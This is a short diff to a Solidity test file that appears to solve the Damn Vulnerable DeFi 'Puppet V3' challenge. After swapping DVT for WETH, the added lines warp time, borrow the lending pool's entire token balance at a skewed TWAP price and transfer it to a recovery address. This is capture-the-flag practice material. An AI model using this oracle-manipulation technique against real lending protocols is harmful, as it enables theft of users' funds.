@@ -121,6 +121,7 @@ contract PuppetV3Challenge is Test {
      */
     function test_puppetV3() public checkSolvedByPlayer {
         address uniswapRouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
+        // approve router address to spend DVTs in order to swap for ETH
         token.approve(uniswapRouter, type(uint256).max);
 
         // convert DVT into WETH
@@ -136,6 +137,11 @@ contract PuppetV3Challenge is Test {
                 0
             )
         );
+        vm.warp(block.timestamp + 110);
+        uint256 amountOfCollateralRequired = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        weth.approve(address(lendingPool), amountOfCollateralRequired);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
